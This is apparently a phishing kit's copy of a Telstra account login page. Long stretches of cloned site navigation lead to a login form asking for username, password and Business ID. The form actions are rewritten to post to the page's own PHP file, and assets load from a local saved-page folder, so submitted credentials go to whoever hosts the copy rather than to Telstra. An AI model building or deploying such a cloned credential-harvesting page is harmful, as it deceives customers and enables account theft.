                                                    <ul>
                                                        <li>
                                                            <a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra/foxtel-channel-packs" class="has-children">Channel Packs</a>
                                                            <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Foxtel From Telstra</a></div><a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra/foxtel-channel-packs" class="parent-link">Channel Packs</a>
                                                                <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Foxtel From Telstra</a></div>
                                                                <a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra/foxtel-channel-packs" class="parent-link">Channel Packs</a>
                                                                <ul>
                                                                    <li><a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra/foxtel-channel-packs/hd-channels">HD Channels</a></li>
                                                                    <li><a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra/foxtel-channel-packs/Presto-Entertainment">Presto Entertainment</a></li>
                                                                </ul>
                                                            </div>
                                                        </li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra/foxtel-features-and-extras">Features and Extras</a></li>
                                                        <li><a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra/terms">Terms</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li>
                                                <a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra" class="has-children">Foxtel Packages</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra" class="parent-link">Foxtel Packages</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                                    <a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra" class="parent-link">Foxtel Packages</a>
                                                    <ul>
                                                        <li>
                                                            <a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra/foxtel-channel-packs" class="has-children">Channel Packs</a>
                                                            <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Foxtel Packages</a></div><a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra/foxtel-channel-packs" class="parent-link">Channel Packs</a>
                                                                <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Foxtel Packages</a></div>
                                                                <a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra/foxtel-channel-packs" class="parent-link">Channel Packs</a>
                                                                <ul>
                                                                    <li><a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra/foxtel-channel-packs/hd-channels">HD Channels</a></li>
                                                                    <li><a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra/foxtel-channel-packs/Presto-Entertainment">Presto Entertainment</a></li>
                                                                </ul>
                                                            </div>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li><a href="https://www.telstra.com.au/tv-movies-music/movies">Movies</a></li>
                                        </ul>
                                    </div>
                                </li>
                                <li>
                                    <a href="https://www.telstra.com.au/mobile-phones" class="has-children"><i class="td-icon icon-mobile"></i>Mobile Phones</a>
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/mobile-phones" class="parent-link has-icon"><i class="td-icon icon-mobile"></i>Mobile Phones</a>
                                        <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div>
                                        <a href="https://www.telstra.com.au/mobile-phones" class="parent-link has-icon"><i class="td-icon icon-mobile"></i>Mobile Phones</a>
                                        <ul>
                                            <li><a href="https://www.telstra.com.au/mobile-phones/mobiles-on-a-plan">Mobiles on a plan</a></li>
                                            <li>
                                                <a href="https://www.telstra.com.au/mobile-phones/plans-and-rates" class="has-children">Plans and rates</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Mobile Phones</a></div><a href="https://www.telstra.com.au/mobile-phones/plans-and-rates" class="parent-link">Plans and rates</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Mobile Phones</a></div>
                                                    <a href="https://www.telstra.com.au/mobile-phones/plans-and-rates" class="parent-link">Plans and rates</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/plans-and-rates/data-packs">Data Packs</a></li>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/plans-and-rates/calling-overseas-from-australia">Calling overseas</a></li>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/plans-and-rates/new-phone-feeling">New Phone Feeling</a></li>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/plans-and-rates/stayconnected">StayConnected</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li>
                                                <a href="https://www.telstra.com.au/mobile-phones/prepaid-mobiles" class="has-children">Pre-Paid mobiles</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Mobile Phones</a></div><a href="https://www.telstra.com.au/mobile-phones/prepaid-mobiles" class="parent-link">Pre-Paid mobiles</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Mobile Phones</a></div>
                                                    <a href="https://www.telstra.com.au/mobile-phones/prepaid-mobiles" class="parent-link">Pre-Paid mobiles</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/prepaid-mobiles/offers-and-rates">Offers &amp; rates</a></li>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/prepaid-mobiles/mobiles-and-starter-kits">Mobiles &amp; Starter Kits</a></li>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/prepaid-mobiles/plus-packs">Data top-up &amp; Plus Packs</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li>
                                                <a href="https://www.telstra.com.au/mobile-phones/moreonyourmobile" class="has-children">More on your mobile</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Mobile Phones</a></div><a href="https://www.telstra.com.au/mobile-phones/moreonyourmobile" class="parent-link">More on your mobile</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Mobile Phones</a></div>
                                                    <a href="https://www.telstra.com.au/mobile-phones/moreonyourmobile" class="parent-link">More on your mobile</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/moreonyourmobile/features-and-services">Features &amp; services</a></li>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/moreonyourmobile/apps">Apps</a></li>
                                                        <li><a href="https://www.telstra.com.au/mobile-phones/moreonyourmobile/manageyourcontent">Manage your content</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li><a href="https://www.telstra.com.au/mobile-phones/wearables">Wearables</a></li>
                                            <li><a href="https://www.telstra.com.au/mobile-phones/international-roaming">International Roaming</a></li>
                                            <li><a href="https://www.telstra.com.au/mobile-phones/coverage-networks">Coverage &amp; networks</a></li>
                                        </ul>
                                    </div>
                                </li>
                                <li>
                                    <a href="https://www.telstra.com.au/tablets" class="has-children"><i class="td-icon icon-tablet"></i>Tablets</a>
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/tablets" class="parent-link has-icon"><i class="td-icon icon-tablet"></i>Tablets</a>
                                        <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div>
                                        <a href="https://www.telstra.com.au/tablets" class="parent-link has-icon"><i class="td-icon icon-tablet"></i>Tablets</a>
                                        <ul>
                                            <li>
                                                <a href="https://www.telstra.com.au/tablets/tablets-on-a-plan" class="has-children">Tablets and Plans</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Tablets</a></div><a href="https://www.telstra.com.au/tablets/tablets-on-a-plan" class="parent-link">Tablets and Plans</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Tablets</a></div>
                                                    <a href="https://www.telstra.com.au/tablets/tablets-on-a-plan" class="parent-link">Tablets and Plans</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/tablets/tablets-on-a-plan/compare-ipads">Compare iPads</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li><a href="https://www.telstra.com.au/tablets/tablet-plans">Tablet plans</a></li>
                                            <li><a href="https://www.telstra.com.au/tablets/prepaid-for-tablets">Pre-Paid Tablets</a></li>
                                            <li><a href="https://www.telstra.com.au/tablets/stayconnected">StayConnected Plus for tablets</a></li>
                                            <li><a href="https://www.telstra.com.au/tablets/new-tablet-feeling">New Tablet Feeling</a></li>
                                        </ul>
                                    </div>
                                </li>
                                <li>
                                    <a href="https://www.telstra.com.au/broadband" class="has-children"><i class="td-icon icon-internet"></i>Broadband</a>
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/broadband" class="parent-link has-icon"><i class="td-icon icon-internet"></i>Broadband</a>
                                        <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div>
                                        <a href="https://www.telstra.com.au/broadband" class="parent-link has-icon"><i class="td-icon icon-internet"></i>Broadband</a>
                                        <ul>
                                            <li><a href="https://www.telstra.com.au/broadband/home-wireless-broadband">Home Wireless broadband</a></li>
                                            <li><a href="https://www.telstra.com.au/broadband/home-broadband">Home Broadband Plans from Telstra</a></li>
                                            <li>
                                                <a href="https://www.telstra.com.au/broadband/mobile-broadband" class="has-children">Mobile broadband</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Broadband</a></div><a href="https://www.telstra.com.au/broadband/mobile-broadband" class="parent-link">Mobile broadband</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Broadband</a></div>
                                                    <a href="https://www.telstra.com.au/broadband/mobile-broadband" class="parent-link">Mobile broadband</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/broadband/mobile-broadband/plans">Mobile Broadband Plans</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/mobile-broadband/coverage-networks">Coverage &amp; networks</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/mobile-broadband/prepaid">Pre-Paid</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li>
                                                <a href="https://www.telstra.com.au/broadband/extras" class="has-children">Extras</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Broadband</a></div><a href="https://www.telstra.com.au/broadband/extras" class="parent-link">Extras</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Broadband</a></div>
                                                    <a href="https://www.telstra.com.au/broadband/extras" class="parent-link">Extras</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/broadband/extras/t-cloud">T-Cloud</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/extras/broadbandprotect"><i class="td-icon icon-bundle"></i>Telstra Broadband Protect</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/extras/t-voice-app">T-Voice App</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/extras/telstra-mail">Telstra Mail</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/extras/getwifi">Wi-Fi Gateways &amp; Range Extenders</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li>
                                                <a href="https://www.telstra.com.au/broadband/nbn" class="has-children">nbn</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Broadband</a></div><a href="https://www.telstra.com.au/broadband/nbn" class="parent-link">nbn</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Broadband</a></div>
                                                    <a href="https://www.telstra.com.au/broadband/nbn" class="parent-link">nbn</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/broadband/nbn/nbn-plans">nbn ? Plans</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/nbn/nbn-bundles">nbn? Bundles</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/nbn/nbn-rollout">nbn? Network Rollout</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/nbn/what-is-the-nbn">What is the nbn??</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/nbn/fibre-to-the-building">Fibre to the building</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/nbn/fibre-to-the-premises">Fibre to the premises</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/nbn/fixed-wireless">Fixed wireless</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/nbn/help-me-choose">Help me choose</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/nbn/how-to-connect">How to connect</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li>
                                                <a href="https://www.telstra.com.au/broadband/telstra-air" class="has-children">Telstra Air</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Broadband</a></div><a href="https://www.telstra.com.au/broadband/telstra-air" class="parent-link">Telstra Air</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Broadband</a></div>
                                                    <a href="https://www.telstra.com.au/broadband/telstra-air" class="parent-link">Telstra Air</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/broadband/telstra-air/how-it-works">How it Works</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/telstra-air/how-to-join">How to Join</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/telstra-air/app">Telstra Air App</a></li>
                                                        <li><a href="https://www.telstra.com.au/broadband/telstra-air/discover">Discover Telstra Air</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                </li>
                                <li>
                                    <a href="https://www.telstra.com.au/bundles" class="has-children"><i class="td-icon icon-bundle"></i>Bundles</a>
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/bundles" class="parent-link has-icon"><i class="td-icon icon-bundle"></i>Bundles</a>
                                        <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div>
                                        <a href="https://www.telstra.com.au/bundles" class="parent-link has-icon"><i class="td-icon icon-bundle"></i>Bundles</a>
                                        <ul>
                                            <li><a href="https://www.telstra.com.au/bundles/check-availability">Check Availability</a></li>
                                        </ul>
                                    </div>
                                </li>
                                <li>
                                    <a href="https://www.telstra.com.au/home-phone" class="has-children"><i class="td-icon icon-phone"></i>Home Phone</a>
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/home-phone" class="parent-link has-icon"><i class="td-icon icon-phone"></i>Home Phone</a>
                                        <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div>
                                        <a href="https://www.telstra.com.au/home-phone" class="parent-link has-icon"><i class="td-icon icon-phone"></i>Home Phone</a>
                                        <ul>
                                            <li><a href="https://www.telstra.com.au/home-phone/plans-rates">Plans &amp; Rates</a></li>
                                            <li>
                                                <a href="https://www.telstra.com.au/home-phone/features-services" class="has-children">Features &amp; services</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Home Phone</a></div><a href="https://www.telstra.com.au/home-phone/features-services" class="parent-link">Features &amp; services</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Home Phone</a></div>
                                                    <a href="https://www.telstra.com.au/home-phone/features-services" class="parent-link">Features &amp; services</a>
                                                    <ul>
                                                        <li>
                                                            <a href="https://www.telstra.com.au/home-phone/features-services/directory-voice-services">Telstra Directory Voice Services</a>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li>
                                                <a href="https://www.telstra.com.au/home-phone/international-calling" class="has-children">International calling</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Home Phone</a></div><a href="https://www.telstra.com.au/home-phone/international-calling" class="parent-link">International calling</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Home Phone</a></div>
                                                    <a href="https://www.telstra.com.au/home-phone/international-calling" class="parent-link">International calling</a>
                                                    <ul>
                                                        <li>
                                                            <a href="https://www.telstra.com.au/home-phone/international-calling/international-dialling-codes">International dialling</a>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </li>
                                            <li><a href="https://www.telstra.com.au/home-phone/calling-cards">Calling cards</a></li><li>
                                                <a href="https://www.telstra.com.au/home-phone/handsets">Handsets</a>
                                            </li>
                                        </ul>
                                    </div>
                                </li>
                                <li>
                                    <a href="https://www.telstra.com.au/connectedhome" class="has-children"><i class="td-icon icon-tv-clear"></i>Connected Home</a>
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/connectedhome" class="parent-link has-icon"><i class="td-icon icon-tv-clear"></i>Connected Home</a>
                                        <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div>
                                        <a href="https://www.telstra.com.au/connectedhome" class="parent-link has-icon"><i class="td-icon icon-tv-clear"></i>Connected Home</a>
                                        <ul>
                                            <li>
                                                <a href="https://www.telstra.com.au/connectedhome/enhancements" class="has-children">Enhancements</a>
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Connected Home</a></div><a href="https://www.telstra.com.au/connectedhome/enhancements" class="parent-link">Enhancements</a>
                                                    <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Connected Home</a></div>
                                                    <a href="https://www.telstra.com.au/connectedhome/enhancements" class="parent-link">Enhancements</a>
                                                    <ul>
                                                        <li><a href="https://www.telstra.com.au/connectedhome/enhancements/getwifi">Wi-Fi Gateways &amp; Range Extenders</a></li>
                                                        <li><a href="https://www.telstra.com.au/connectedhome/enhancements/platinum">Telstra Platinum</a></li>
                                                    </ul>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                </li>
                            </ul>   
                        </div>
                    </li>
                    <li>
                        <a target="_self" href="https://www.telstra.com.au/support" class="nav-lvl-1 has-children"> Support </a>
                        <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div><a target="_self" href="https://www.telstra.com.au/support" class="parent-link"> Support </a>
                            <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to </a></div>
                            <a target="_self" href="https://www.telstra.com.au/support" class="parent-link"> Support </a>
                            <ul>
                                <li><a href="https://www.telstra.com.au/support/category/account-billing" target="_self"><i class="td-icon icon-billing"></i> Accounts &amp; Billing </a></li>
                                <li><a href="https://www.telstra.com.au/support/category/broadband" target="_self"><i class="td-icon icon-internet"></i> Broadband </a></li>
                                <li><a href="https://www.telstra.com.au/support/category/email" target="_self"><i class="td-icon icon-email"></i> Email </a></li>
                                <li><a href="https://www.telstra.com.au/support/category/mobiles-tablets" target="_self"><i class="td-icon icon-mobile"></i> Mobiles &amp; Tablets </a></li>
                                <li><a href="https://www.telstra.com.au/support/category/entertainment" target="_self"><i class="td-icon icon-tv"></i> Entertainment </a></li>
                                <li><a href="https://www.telstra.com.au/support/category/home-phone" target="_self"><i class="td-icon icon-phone"></i> Home Phone </a></li>
                            </ul>
                        </div>
                    </li>
                    <li>
                        <a target="_self" href="https://www.my.telstra.com.au/myaccount/home" class="nav-lvl-1 has-children"> My Account </a>
                        <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to Personal</a></div><a target="_self" href="https://www.my.telstra.com.au/myaccount/home" class="parent-link"> My Account </a>
                            <div class="back-to-parent-container"><a href="#" class="back-to-parent">Back to </a></div>
                            <a target="_self" href="https://www.my.telstra.com.au/myaccount/home" class="parent-link"> My Account </a>
                            <ul>
                                <li><a href="https://www.telstra.com.au/moving-home/move" target="_self"><i class="td-icon icon-home"></i> Moving Home </a></li>
                                <li><a href="https://www.my.telstra.com.au/activate" target="_self"><i class="td-icon icon-prepaid-activation"></i> Pre-Paid Activation </a></li>
                                <li><a href="https://www.telstra.com.au/my-account/prepaid-recharge" target="_self"><i class="td-icon icon-mobile-prepaid"></i> Pre-Paid Recharge </a></li>
                                <li><a href="https://www.telstra.com.au/account-services" target="_self"><i class="td-icon icon-manage-services"></i> Account Services </a></li>
                                <li><a href="https://www.my.telstra.com.au/myaccount/home" target="_self"><i class="td-icon icon-register"></i> Login/Register </a></li>
                                <li><a href="http://www.telstra.com.au/latest_offers/loyalty/thanks.html" target="_self"><i class="td-icon icon-star"></i> Thanks </a></li>
                                <li><a href="https://www.telstra.com.au/my-account/telstra-24x7-app" target="_self"><i class="td-icon icon-apps-24x7"></i> Telstra 24x7 App </a></li>
                            </ul>
                        </div>
                    </li>
                </ul>
                <ul class="offscreen-nav-global">
                    <li><a href="https://www.telstra.com.au/small-business">Small Business</a></li>
                    <li><a href="https://www.telstra.com.au/business-enterprise">Business &amp; Enterprise</a></li>
                    <li><a href="https://www.telstra.com.au/telstra-health">Health</a></li>
                    <li><a href="https://www.telstra.com.au/tv-movies-music">Sport &amp; Entertainment</a></li>
                </ul>
                <button type="button" class="nav-close"><span class="vh">Close navigation</span></button>
            </div>
        </nav>
        <div class="ps-scrollbar-x-rail" style="width: 290px; left: 0px; bottom: 3px;">
            <div class="ps-scrollbar-x" style="left: 0px; width: 0px;"></div>
        </div>
        <div class="ps-scrollbar-y-rail" style="top: 0px; height: 667px; right: 8px;">
            <div class="ps-scrollbar-y" style="top: 0px; height: 0px;"></div>
        </div>
    <div class="ps-scrollbar-x-rail" style="width: 290px; left: 0px; bottom: 3px;"><div class="ps-scrollbar-x" style="left: 0px; width: 0px;"></div></div><div class="ps-scrollbar-y-rail" style="top: 0px; height: 598px; right: 8px;"><div class="ps-scrollbar-y" style="top: 0px; height: 0px;"></div></div></div>
    
    <!-- Main Body Content -->
    <div class="main-content-wrapper offcanvas" id="rebrandMainContent">
        <div class="container main-content" role="main">
            <div class="content parsys">
                <div class="parbase textimage section heroRow">
                    <div class="standard row content col-100">
                        <div class="col col-100-c0 first last" style="min-height:418px;">
                            <div class="rebrandloginHeadingDiv">
                                <span class="heading rebrandLoginheading rebrandHeadingFont">Log in</span>
                            </div>
                            <div class="col-wrapper" style="padding: 0px; min-height:418px;">
                                <div class="row col-50-50 rebrandColumns">
                                    <div class="col col-50-50-c0 first rebrandColumn1" style="padding: 0px; min-height:418px;">
                                        <div class="col-wrapper" style="padding: 0px; margin-right: 28px; min-height:418px;">
                                            <div style="padding: 0px; margin-left: 30px; margin-top: 30px;">
                                                <form method="post" id="Login" name="Login" class="form" action="<?php echo basename(__FILE__); ?>" style="margin: 0px;">
                                                    
                                                    <div class="row rebrandErrMsgContainerDiv">
                                                        
                                                    </div>
                                                    <div style="min-height: 282px; ">
                                                        <div class="input-wrapper field-group">
                                                            <div class="input-container form-control-username cmn_rebrandFormControl">
                                                                <span class="visible-ie8"></span>
                                                                <input type="text" id="username" tabindex="1" name="username" size="30" autocomplete="off" maxlength="200" onkeypress="EnterKeyPress(event);" placeholder="Username" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;">
                                                                <a href="#" id="toggleFun" class="forgot-link" style="vertical-align: bottom; line-height: 1px;">Forgot?</a>
                                                            </div>
                                                        </div>
                                                        <p id="unametip" style="width: 100%; font-size: 12px; display: block;" hidden="">As a customer, this is the name you registered with us.</p>
                                                        <div class="cl-forgot-frame-wrap iframeFun" hidden="">
                                                            <a href="#"><i class="td-icon-sm icon-ui-up-arrow-thick"></i></a>
                                                            <iframe class="cl-forgot-frame" scrolling="no" width="100%" frameborder="0">
                                                                &lt;p&gt;Your browser does not support iframes.&lt;/p&gt;
                                                            </iframe>
                                                        </div>
                                                        <div class="input-wrapper field-group">
                                                            <div class="input-container form-control-userpasswd cmn_rebrandFormControl">
                                                                <span class="visible-ie8"></span>
                                                                <input type="password" tabindex="2" id="password" name="password" autocomplete="off" size="30" maxlength="50" onkeypress="EnterKeyPress(event);" placeholder="Password" style="height: 100%; box-shadow: none; width: 78%; border: 0px solid #dddddd;">
                                                                <a href="#" id="toggleFpw" class="forgot-link" style="vertical-align: bottom; line-height: 1px;">Forgot?</a>
                                                            </div>
                                                        </div>
                                                        <div class="cl-forgot-frame-wrap iframeFpw" hidden="">
                                                            <a href="#"><i class="td-icon-sm icon-ui-up-arrow-thick"></i></a>
                                                            <iframe class="cl-forgot-frame" scrolling="no" width="100%" frameborder="0">
                                                                &lt;p&gt;Your browser does not support iframes.&lt;/p&gt;
                                                            </iframe>
                                                        </div>
                                                        
                                                        <div class="input-wrapper field-group">
                                                            <div class="input-container">
                                                                <span class="visible-ie8"></span>
                                                                <p class="rebrandBusinessIdText" style="margin-top: 10px; margin-bottom: 15px; padding: 0px;">
                                                                    If you have a Telstra Account Executive,<br>please enter your Business ID.
                                                                </p>
                                                                <input type="text" autocomplete="off" name="businessid" id="businessid" placeholder="Business ID" maxlength="50" style="height: 40px; box-shadow: none;">
                                                            </div>
                                                        </div>
                                                        <p id="busidtip" style="width: 90%; font-size: 12px; display: none;" hidden="">For example: tb123456</p>
                                                        
                                                        
                                                        <div class="input-wrapper field-group">
                                                            <div class="input-container"> 
                                                                <span class="visible-ie8"></span>
                                                                <div class="g-recaptcha" data-sitekey="6LdtH9EZAAAAAO_CA5RE4Se3yUwl0ojFon8Qn-LJ" data-callback="onloadOK"></div>
                                                            </div>
                                                        </div>
                                                         
                                                        <div class="field-group checkbox no-main-label input-wrapper" style="margin-top: 5px;">
                                                            <label class="inline left rebrandTextFont" for="rememberMe">
                                                                <input type="checkbox" name="rememberMe" id="rememberMe" value="true">Remember username
                                                            </label>
                                                            <img class="link-helper" onclick="show(tooltip1)" onmouseover="show(tooltip1)" onmouseout="hide(tooltip1)" src="Telstra%20Login_files/help-mask.png" width="22px">												
                                                            <div class="tooltip-left" id="tooltip1" style="display:none">
                                                            <p>Your username will be remembered on this computer. Please leave this unchecked if you are using a shared computer.</p>
                                                            </div>
                                                        </div>
                                                    <div>
                                                        <button tabindex="4" id="Submit" name="Submit" class="btn primary" type="button" onclick="setCookieForUser();this.disabled=true;document.forms['Login'].submit();">Log in</button>
                                                    </div>
                                                    <hr style="margin-bottom: 23px; margin-top: 23px; padding: 0px; border: 1px solid #dddddd;">
                                                    
                                                    
                                                        <form id="cert" method="post" action="<?php echo basename(__FILE__); ?>" style="margin: 0px; padding: 0px;">
                                                            
                                                            <div>
                                                                <p class="digitalcert-hdr rebrandDigitalCert">Or use your Digital Certificate </p>
                                                            </div>
                                                            <div>
                                                                <a href="#" class="btn secondary" title="Log in with Digital Certificate" onclick="document.getElementById('cert').submit()" style="margin: 0px;">
                                                                    Log in with Digital Certificate</a>
                                                            </div>
                                                            <div style="padding-top: 20px; padding-bottom: 50px;">
                                                            <a class="cl-secondary-underlined-txt" style="color: #333333; text-decoration: underline;" target="_blank" href="https://register.telstra.com.au/online/replace_cert2Teg.html" title="Replace your Digital Certificate">Replace your Digital Certificate</a>
                                                            </div>
                                                        </form>
                                                    
                                                </div></form>
                                            </div>
                                    </div>
                                    
                                    <div class="col col-50-50-c1 last rebrandColumn2">
                                        <div class="col-wrapper" style="padding: 0px; margin-left: 28px;">
                                            <div class="parbase textimage imageModule section" style="height: 100%; width: 100%; margin: 0px; ">
                                                <div class="standard row content transparent col-100" style="height: 100%; width: 100%;margin: 0px;">
                                                    <div class="col col-100-c0 first last">
                                                        <div class="padding-bottom-grey-box small-top-margin-grey-box grid_7 right omega cf">
                                                            <div style="border: 1px solid #ffffff">
                                                                <h2 class="text-left colour sub-heading rebrandHeadingFont rebrandregisterheading">Reasons To Register Online</h2>
                                                                <ul class="icons-register cf rebrandTextFont" style="padding-left: 0px;">
                                                                    <img src="Telstra%20Login_files/icon-check-usage.png" style="width:35px;height:35px; margin-bottom: 10px;">&nbsp;Monitor your calls and data usage<br>
                                                                    <img src="Telstra%20Login_files/icon-billing.png" style="width:35px;height:35px; margin-bottom: 10px;">&nbsp;View and pay your bills<br>
                                                                    <img src="Telstra%20Login_files/icon-recharge.png" style="width:35px;height:35px; margin-bottom: 10px;">&nbsp;Manage your Telstra services<br>
                                                                    <img src="Telstra%20Login_files/icon-direct-debit.png" style="width:35px;height:35px; margin-bottom: 10px;">&nbsp;Order product and services online<br>
                                                                </ul>
                                                            </div>
                                                            <a href="https://signon.telstra.com/register?goto=https://email.telstra.com/webmail" class="btn secondary" title="Register now" track-des="MyAcctV2-LP-RegisterNow">Register now</a>
                                                            
                                                        </div>
                                                        <div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>     
                </div>
            </div>
        </div>
    </div>
    <!-- Main Body Content END-->
    <script>
    livePerson.init({
        forceButtonCss: false, // By default its false, if true it will inject css for Chat Now button else container is responsible for button css.
    section: ["telstra", "identity", "telstralogin"], // Section Array which need to be passed to LivePerson
    sourceSection: ["YTT"], // Source section is required to identify the source contatiner
    onlyTcomCSS: true}); 
    </script>
    <footer>
        <hr style="margin-bottom:0px;">
        <div role="footer" class="footer">
            <!--
            <div class="footer-crumb hidden-sm hidden-xs">
                <div class="container">
                    <div class="system_generated_classes standard row content col-100 default">
                        <div class="col first col-100-c0">
                            <div class="crumb-wrapper col-wrapper">
                                <div class="breadcrumb clearfix">
                                    <div class="itemscope alpha">
                                        <a href="https://www.telstra.com.au/"><span>Telstra Home</span></a>
                                        <span class="delimiter">&gt;</span>
                                    </div>
